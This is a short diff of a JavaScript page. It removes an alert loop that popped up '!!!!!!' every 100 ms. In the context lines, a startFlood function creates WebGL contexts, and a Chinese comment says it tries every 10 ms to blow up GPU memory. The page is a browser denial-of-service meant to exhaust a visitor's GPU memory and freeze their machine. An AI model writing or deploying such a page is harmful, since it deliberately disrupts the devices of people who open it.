@@ -29,11 +29,6 @@
             }, 10); // 每 10ms 尝试炸 GPU 内存
                     function startFlood() {
             const gl = createWebGLContext();
-
-            // 不断弹窗提示 "!!!!!!"
-            setInterval(() => {
-                alert("!!!!!!");
-            }, 100); // 每 100ms 弹出一次提示
         }
     
         startFlood();
